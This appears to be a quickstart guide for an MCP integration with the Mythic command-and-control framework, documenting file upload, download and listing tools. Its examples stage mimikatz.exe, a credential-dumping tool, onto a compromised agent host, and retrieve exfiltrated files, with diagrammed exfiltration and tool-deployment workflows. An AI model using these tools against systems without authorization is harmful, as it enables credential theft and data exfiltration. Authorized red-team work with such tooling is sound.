# Quickstart: Core File Management Tools

**Feature**: 004-core-file-tools
**Date**: 2026-02-01

## Overview

This feature adds four MCP tools for managing files on the Mythic server:

| Tool | Purpose |
|------|---------|
| `core_upload_file` | Upload a file to Mythic for agent tasking |
| `core_download_file` | Download a file from Mythic by UUID |
| `core_list_downloaded_files` | List files downloaded from agents |
| `core_list_uploaded_files` | List files uploaded to Mythic |

## Prerequisites

- MythicMCP server running and connected to Mythic
- Current operation set via `core_set_operation`

## Usage Examples

### Upload a File for Agent Tasking

```python
# 1. Read and encode file
import base64
with open("mimikatz.exe", "rb") as f:
    content = base64.b64encode(f.read()).decode()

# 2. Upload via MCP tool
result = await core_upload_file(
    filename="mimikatz.exe",
    content=content
)

# 3. Use file_id in agent task
file_id = result["file_id"]
await apollo_upload(callback_id=1, file=file_id, path="C:\\temp\\mimi.exe")
```

### Download an Exfiltrated File

```python
# 1. List downloaded files to find UUID
files = await core_list_downloaded_files()
target_file = files["files"][0]

# 2. Download content
result = await core_download_file(file_uuid=target_file["file_uuid"])

# 3. Decode and save
import base64
content = base64.b64decode(result["content"])
with open(target_file["filename"], "wb") as f:
    f.write(content)
```

### View All Files in Operation

```python
# List downloaded files (from agents)
downloaded = await core_list_downloaded_files()
print(f"Downloaded {downloaded['count']} files from agents")

# List uploaded files (to Mythic)
uploaded = await core_list_uploaded_files()
print(f"Uploaded {uploaded['count']} files to Mythic")
```

## File Size Limits

- **Recommended upload**: < 10MB for responsive operation
- **Maximum download**: ~50MB (larger files may timeout)
- All content is base64-encoded, adding ~33% overhead

## Common Workflows

### Exfiltration Workflow

```
Agent → apollo_download(path) → Mythic stores file
                                     ↓
Operator → core_list_downloaded_files() → finds file_uuid
                                     ↓
Operator → core_download_file(uuid) → retrieves content
```

### Tool Deployment Workflow

```
Operator → core_upload_file(content) → Mythic stores file → returns file_id
                                                                  ↓
Operator → apollo_upload(file=file_id, path) → Agent receives file
```

## Troubleshooting

| Error | Cause | Solution |
|-------|-------|----------|
| "No current operation set" | Operation not selected | Run `core_set_operation` first |
| "File not found" | Invalid UUID | Check UUID in `core_list_downloaded_files` |
| "Invalid base64" | Malformed content | Ensure proper base64 encoding |
| "Connection error" | Mythic unreachable | Check `core_check_connection` |
